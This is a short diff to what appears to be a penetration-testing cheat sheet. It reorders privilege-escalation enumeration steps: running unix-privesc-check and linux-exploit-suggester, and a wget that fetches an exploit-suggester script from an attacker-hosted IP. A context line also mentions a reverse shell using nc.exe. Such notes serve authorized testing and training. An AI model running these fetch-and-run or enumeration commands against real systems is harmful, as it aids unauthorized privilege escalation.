@@ -296,11 +296,11 @@ PowerShell with nc.exe or another rev shell .exe
     chmod +x ./unix-privesc-check
     ./unix-privesc-check
 
-    cd /ftphome 
-    ./linux-exploit-suggester.sh --uname 2.6.18-274.3.1.el5
-
     wget 10.10.10.10/solaris-exploit-suggester.pl
     perl solaris-exploit-suggester.pl
+
+Local 
+    ./linux-exploit-suggester.sh --uname 2.6.18-274.3.1.el5
 
 <h4>Linux Commands</h4>
  
